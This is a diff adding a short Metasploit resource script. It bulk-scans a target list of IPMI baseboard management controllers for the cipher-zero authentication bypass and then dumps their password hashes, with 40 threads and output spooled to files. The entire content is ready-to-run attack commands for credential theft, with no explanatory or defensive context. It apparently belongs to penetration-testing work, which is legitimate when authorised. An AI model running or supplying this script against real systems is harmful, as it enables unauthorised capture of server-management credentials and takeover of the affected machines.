@@ -1,0 +1,13 @@
+use auxiliary/scanner/ipmi/ipmi_cipher_zero
+set rhosts file:../targets_ipmi.txt
+set threads 40
+spool ipmi_cipher_zero.txt
+run
+spool off
+
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set rhosts file:../targets_ipmi.txt
+set threads 40
+spool ipmi_cipher_dumphashes.txt
+run
+spool off
